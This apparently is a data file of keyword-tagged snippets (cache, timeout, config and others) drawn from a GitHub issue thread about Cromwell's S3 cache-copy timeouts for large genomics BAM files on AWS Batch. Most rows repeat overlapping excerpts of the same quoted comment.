line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1733,Modifiability,config,config,1733,"he copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:44,Performance,cache,cached,44,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:743,Performance,cache,cached,743,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:865,Performance,cache,cached,865,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1068,Performance,perform,perform,1068,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1151,Performance,cache,cached,1151,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1597,Performance,cache,cache,1597,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1626,Performance,cache,cache,1626,"g (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1705,Performance,cache,cache,1705,"e. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1756,Performance,tune,tune,1756,"he copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1876,Performance,cache,cache,1876,"ell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2025,Performance,Cache,Cache,2025,"ay be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2547,Performance,cache,cacheCopy,2547,"mics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of pote",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:3259,Performance,cache,cached,3259,"Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of potential reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:999,Safety,timeout,timeout,999,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
